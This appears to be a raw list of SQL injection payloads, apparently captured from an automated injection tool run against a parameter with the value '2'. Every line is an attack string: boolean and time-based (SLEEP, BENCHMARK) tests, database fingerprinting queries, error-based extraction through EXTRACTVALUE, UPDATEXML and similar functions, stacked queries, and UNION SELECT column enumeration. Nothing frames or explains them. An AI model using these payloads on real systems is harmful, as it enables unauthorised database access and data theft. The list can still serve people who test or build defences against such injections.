"2...))',,("""
"2'BJFmIb<'"">sBuznf"
2) AND 4544=3303-- fIxm
2) AND 5489=5489-- kDxo
2') AND 3359=2153-- mhsG
2') AND 5489=5489-- XOZE
2' AND 2308=4240-- ICrE
2' AND 5489=5489-- Lphl
2' AND 7232=3419-- BFwH
2' AND (SELECT CVAR(NULL) FROM MSysAccessObjects) IS NULL-- hbxd
"2' AND (SELECT TDESENCRYPT(NULL,NULL)) IS NULL-- TidC"
2' AND (SELECT %SQLUPPER NULL) IS NULL-- qTTg
2' AND (SELECT halfMD5(NULL) IS NULL) IS NULL-- Cpdd
2' AND (SELECT MD5(NULL~NULL)) IS NULL-- rICW
2' AND (SELECT (NULL SETEQ NULL)) IS NULL-- YBQG
2' AND (SELECT CHR(82)||CHR(66)||CHR(67)||CHR(80) FROM SYSIBM.SYSDUMMY1)='RBCP'-- vPXg
"2' AND (SELECT NULLIF(USER,SESSION_USER) FROM SYSIBM.SYSDUMMY1) IS NULL-- ZaqW"
2' AND (SELECT NULLIFZERO(hashcode(NULL))) IS NULL-- tWTT
2' AND (SELECT 'oSfI' FROM RDB$DATABASE)='oSfI'-- yVmN
2' AND (SELECT 'wViw' FROM INFORMATION_SCHEMA.IO_STATISTICS)='wViw'-- Wkif
2' AND (SELECT STRINGTOUTF8(NULL)) IS NULL-- Jaiq
2' AND (SELECT CHAR(73)||CHAR(86)||CHAR(112)||CHAR(115) FROM INFORMATION_SCHEMA.SYSTEM_USERS)='IVps'-- TUQx
2' AND (SELECT 'UtwA' FROM SYSMASTER:SYSDUAL)='UtwA'-- Bfqk
2' AND (SELECT ALPHA(NULL) FROM VERSIONS) IS NULL-- TLMf
2' AND (SELECT TONUMBER(NULL)) IS NULL-- XkZJ
2' AND (SELECT ASCII_CHAR(256) FROM SYSTEM.ONEROW) IS NULL-- KxZc
2' AND (SELECT CODE(NULL)) IS NULL-- DeDo
"2' AND (SELECT DIFFERENCE(NULL,NULL)) IS NULL-- vpMZ"
2' AND (SELECT QUARTER(NULL XOR NULL)) IS NULL-- KLrP
2' AND (SELECT 0x78657667)='XDrP'-- rwzR
"2' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71787a6a71,(SELECT (ELT(9960=9960,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- KAOh"
"2' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71787a6a71,(SELECT (ELT(6090=6090,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- sGOl"
"2' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x71787a6a71,(SELECT (ELT(7705=7705,1))),0x717a767a71,0x78))x))-- jBcG"
"2' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71787a6a71,(SELECT (ELT(3325=3325,1))),0x717a767a71,0x78))x))-- BngJ"
"2' AND GTID_SUBSET(CONCAT(0x71787a6a71,(SELECT (ELT(7878=7878,1))),0x717a767a71),7878)-- jyRh"
"2' OR GTID_SUBSET(CONCAT(0x71787a6a71,(SELECT (ELT(1880=1880,1))),0x717a767a71),1880)-- YgUQ"
"2' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71787a6a71,(SELECT (ELT(2354=2354,1))),0x717a767a71)) USING utf8)))-- GZLg"
"2' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71787a6a71,(SELECT (ELT(2236=2236,1))),0x717a767a71)) USING utf8)))-- zHYE"
"2' AND (SELECT 2544 FROM(SELECT COUNT(*),CONCAT(0x71787a6a71,(SELECT (ELT(2544=2544,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dqde"
"2' OR (SELECT 2835 FROM(SELECT COUNT(*),CONCAT(0x71787a6a71,(SELECT (ELT(2835=2835,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BXeK"
"2' AND EXTRACTVALUE(5131,CONCAT(0x5c,0x71787a6a71,(SELECT (ELT(5131=5131,1))),0x717a767a71))-- xXyY"
"2' OR EXTRACTVALUE(9151,CONCAT(0x5c,0x71787a6a71,(SELECT (ELT(9151=9151,1))),0x717a767a71))-- QLDI"
"2' AND UPDATEXML(5891,CONCAT(0x2e,0x71787a6a71,(SELECT (ELT(5891=5891,1))),0x717a767a71),8129)-- lACi"
"2' OR UPDATEXML(3008,CONCAT(0x2e,0x71787a6a71,(SELECT (ELT(3008=3008,1))),0x717a767a71),7879)-- ydsN"
"2' AND ROW(7230,9582)>(SELECT COUNT(*),CONCAT(0x71787a6a71,(SELECT (ELT(7230=7230,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM (SELECT 9213 UNION SELECT 5108 UNION SELECT 6351 UNION SELECT 5379)a GROUP BY x)-- hUZw"
"2' OR ROW(5143,2397)>(SELECT COUNT(*),CONCAT(0x71787a6a71,(SELECT (ELT(5143=5143,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM (SELECT 8985 UNION SELECT 4804 UNION SELECT 3884 UNION SELECT 7918)a GROUP BY x)-- SKzI"
-8121
"-9599' OR 1 GROUP BY CONCAT(0x71787a6a71,(SELECT (CASE WHEN (5825=5825) THEN 1 ELSE 0 END)),0x717a767a71,FLOOR(RAND(0)*2)) HAVING MIN(0)#"
"2' PROCEDURE ANALYSE(EXTRACTVALUE(8342,CONCAT(0x5c,0x71787a6a71,(SELECT (CASE WHEN (8342=8342) THEN 1 ELSE 0 END)),0x717a767a71)),1)-- hgsJ"
"(SELECT CONCAT(CONCAT('qxzjq',(CASE WHEN (5005=5005) THEN '1' ELSE '0' END)),'qzvzq'))"
"(SELECT CONCAT(0x71787a6a71,(ELT(8034=8034,1)),0x717a767a71))"
2';SELECT SLEEP(5)#
2';SELECT SLEEP(5)-- pyVz
2';(SELECT * FROM (SELECT(SLEEP(5)))NlBE)#
2';(SELECT * FROM (SELECT(SLEEP(5)))elFt)-- CQTy
"2';SELECT BENCHMARK(5000000,MD5(0x744d6747))#"
"2';SELECT BENCHMARK(5000000,MD5(0x70764a4d))-- WoXS"
2' AND (SELECT 3389 FROM (SELECT(SLEEP(5)))WMTq)-- ZHKj
2' AND (SELECT 3389 FROM (SELECT(SLEEP(0)))WMTq)-- ZHKj
2' AND (SELECT 3389 FROM (SELECT(SLEEP(5)))WMTq)-- ZHKj
2' ORDER BY 1-- -
2' ORDER BY 8691-- -
2' ORDER BY 10-- -
2' ORDER BY 6-- -
2' ORDER BY 4-- -
2' ORDER BY 3-- -
2' ORDER BY 2-- -
"2' UNION ALL SELECT NULL,CONCAT(0x71787a6a71,0x7953737674536848656276464263565575694c747766546a6a58796279786a544a514f736f58784e,0x717a767a71)-- -"
"2' UNION ALL SELECT CONCAT(0x71787a6a71,0x6767665377597147735365677077726e4c6d5241495a6752737079574f73746d587548636a576a6b,0x717a767a71),NULL-- -"
"2' UNION ALL SELECT NULL,CONCAT(0x71787a6a71,0x444d515a467362447a6a,0x717a767a71)-- -"
"2' UNION ALL SELECT CONCAT(0x71787a6a71,0x45626b576a4f7250544a,0x717a767a71),NULL-- -"
"-8186' UNION ALL SELECT NULL,CONCAT(0x71787a6a71,0x516a6749544e497a58714d7162737a574b6d43635159644858494a4e4f6364524c4b7352594d7251,0x717a767a71)-- -"
"-4534' UNION ALL SELECT CONCAT(0x71787a6a71,0x7849544474674875437851506e634c6667746f646f6f49586477436e4c62737a4574614e4c4c4152,0x717a767a71),NULL-- -"
"-2667' UNION ALL SELECT NULL,CONCAT(0x71787a6a71,0x6e614c6a6a6c6a696a68,0x717a767a71)-- -"
"-2585' UNION ALL SELECT CONCAT(0x71787a6a71,0x54576a45516366526b4d,0x717a767a71),NULL-- -"
"2' UNION ALL SELECT CONCAT(0x71787a6a71,0x776579597a5375727469754a6a6d59696c5a7970587143706d6f4a7a7a7443684b656468446b5575,0x717a767a71),73-- -"
"2' UNION ALL SELECT 73,CONCAT(0x71787a6a71,0x58657144786864554d416a595363707149615754566d785251784365614945545172636463714b53,0x717a767a71)-- -"
"2' UNION ALL SELECT CONCAT(0x71787a6a71,0x514d4256505541706f52,0x717a767a71),73-- -"
"2' UNION ALL SELECT 73,CONCAT(0x71787a6a71,0x57445578434464457464,0x717a767a71)-- -"
"-6883' UNION ALL SELECT CONCAT(0x71787a6a71,0x697a6668514c507062726e73666f6c766b485154507778466d657a67506b5a6e48527559796d5976,0x717a767a71),73-- -"
"-3636' UNION ALL SELECT 73,CONCAT(0x71787a6a71,0x69724573666d6d4b584e5a6b7a57766e5741456a4a4b46457747724d4573485066536f75424f7350,0x717a767a71)-- -"
"-1364' UNION ALL SELECT CONCAT(0x71787a6a71,0x7876784a536367657262,0x717a767a71),73-- -"
"-8680' UNION ALL SELECT 73,CONCAT(0x71787a6a71,0x4d55624954416e724155,0x717a767a71)-- -"
2' UNION ALL SELECT NULL-- -
"2' UNION ALL SELECT NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
"2' UNION ALL SELECT CONCAT(0x71787a6a71,0x5a74596b725a684841416c7048445564526a44524b684b44436f6c707363717a74504677686b4962,0x717a767a71),NULL-- -"
"2' UNION ALL SELECT NULL,CONCAT(0x71787a6a71,0x4f517a756e55567063554a78554d6d51677a706169697046464e69634d7a5071657474444c58507a,0x717a767a71)-- -"
"2' UNION ALL SELECT CONCAT(0x71787a6a71,0x647a555453464c566c4c,0x717a767a71),NULL-- -"
"2' UNION ALL SELECT NULL,CONCAT(0x71787a6a71,0x4a69455a6e544c504662,0x717a767a71)-- -"
"-9587' UNION ALL SELECT NULL,CONCAT(0x71787a6a71,0x595242746e41767a444e4143724e6d4d4a574b716353454c6e6c68705a6a5a5a677863564275736c,0x717a767a71)-- -"
"-5403' UNION ALL SELECT CONCAT(0x71787a6a71,0x64597451684c57735259577765446d6a4578736171436e4461557276466b42564c6642744e687268,0x717a767a71),NULL-- -"
"-3707' UNION ALL SELECT NULL,CONCAT(0x71787a6a71,0x6a7a43754e6473554d71,0x717a767a71)-- -"
"-7468' UNION ALL SELECT CONCAT(0x71787a6a71,0x654d57534f6a7a42504f,0x717a767a71),NULL-- -"
"2' UNION ALL SELECT 49,CONCAT(0x71787a6a71,0x754376656e6a425770457253787664515765657556484f584e4c577673565247616872686d4b4e70,0x717a767a71)-- -"
"2' UNION ALL SELECT CONCAT(0x71787a6a71,0x727265786d4a617775626d736977555256794f6759676b7943624f7666546c6c4a5a6c4e71464e4c,0x717a767a71),49-- -"
"2' UNION ALL SELECT 49,CONCAT(0x71787a6a71,0x62754b5971564f46674b,0x717a767a71)-- -"
"2' UNION ALL SELECT CONCAT(0x71787a6a71,0x7a544e4b7a5659514448,0x717a767a71),49-- -"
"-2937' UNION ALL SELECT 49,CONCAT(0x71787a6a71,0x4d614e67547774637663695741796764726e4f6443624a4b66575149696f4b585a5a665341425655,0x717a767a71)-- -"
